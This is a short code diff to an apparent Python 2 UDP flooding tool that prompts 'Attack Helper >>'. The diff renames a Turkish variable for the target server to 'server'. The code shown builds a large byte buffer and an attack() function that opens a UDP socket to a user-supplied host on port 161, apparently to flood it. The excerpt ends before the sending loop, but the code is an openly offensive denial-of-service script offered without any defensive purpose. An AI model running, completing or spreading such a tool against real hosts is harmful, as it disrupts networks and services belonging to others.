@@ -5,17 +5,17 @@ import time
 import os
 
 class datacolins:
-    sunucu = raw_input("Attack Helper >>")
+    server = raw_input("Attack Helper >>")
     byte = 1024
     bit = bytearray(1000000)
     message = buffer(bit,50,byte)
     times = time.time()
-    global sunucu,byte,message,bit
+    global server,byte,message,bit
 datacolins = datacolins()
 
 def attack():
     s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-    host = sunucu
+    host = server
     port = 161
     s.connect((host,port))
     ip = socket.gethostbyname(host)
